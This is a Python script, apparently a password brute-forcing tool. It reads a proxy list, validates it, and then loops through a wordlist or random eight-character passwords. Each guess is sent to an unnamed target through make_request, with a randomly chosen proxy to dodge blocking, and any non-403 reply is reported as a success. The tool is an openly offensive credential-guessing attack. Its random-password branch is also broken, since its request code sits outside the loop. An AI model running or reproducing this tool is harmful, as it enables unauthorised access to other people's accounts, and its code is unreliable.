from sngol import make_request
from proxy import is_bad_proxy, validate_proxy_list, read_proxy_file
import random
import string

using_proxies = True
print("Reading your proxy list... ", end="")
try:
    proxy_list = read_proxy_file("./proxylist.txt")
except Exception as e:
    print("Error! Missing file. Add your proxies to the new .txt in this directory called \"proxylist.txt\", and run the script again.")
    print(e)
    a = open("./proxylist.txt", "w+")
    a.close()
    exit()
    
print(proxy_list)
if (len(proxy_list) == 0):
    print("No proxies in proxy list! Add a few or use your computer's IP.")
    i = input("Do you wish to continue without proxies? (Y/N): ")
    if i == "Y":
        using_proxies = False
    else:
        exit()
else:
    print(f"Loaded {len(proxy_list)}  {'proxy' if len(proxy_list) == 1 else 'proxies'}!")
    print("Validating... ")
    proxy_list = validate_proxy_list(proxy_list)
    if len(proxy_list) == 0:
        print("None of the proxies are valid!")
        i = input("Do you wish to continue without proxies? (Y/N): ")
        if i == "Y":
            using_proxies = False
        else:
            exit()
    else:
        print(f"{len(proxy_list)} {'proxy' if len(proxy_list) == 1 else 'proxies'} are ready to use!")

def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            wordlist = file.read().splitlines()
        return wordlist
    except FileNotFoundError:
        return None

def generate_password(charset, length):
    return ''.join(random.choice(charset) for _ in range(length))

wordlist = load_wordlist('wordlist.txt')
charset = string.ascii_letters + string.digits
password_length = 8

if wordlist:
    wordlist_index = 0
    while True:
        password = wordlist[wordlist_index]
        proxy = random.choice(proxy_list)
        
        print(f"Checking password {password} with {proxy}...")
        try:
            response = make_request(password, proxy)
            
            if response.status_code != 403:
                print(f"Success!!  | {response.text}")
            else:
                print(f"Failure :( | {response.text}")
            
        except Exception as e:
            print(f"Something bad happened... {e}")
            exit()

        wordlist_index += 1
        if wordlist_index >= len(wordlist):
            wordlist_index = 0
else:
    while True:
        password = generate_password(charset, password_length)
        proxy = random.choice(proxy_list)
        
    print(f"Checking password {password} with {proxy}...")
    try:
        response = make_request(password, proxy)
        
        if response.status_code != 403:
            print(f"Success!!  | {response.text}")
        else:
            print(f"Failure :( | {response.text}")
        
    except Exception as e:
        print(f"Something bad happened... {e}")
        exit()
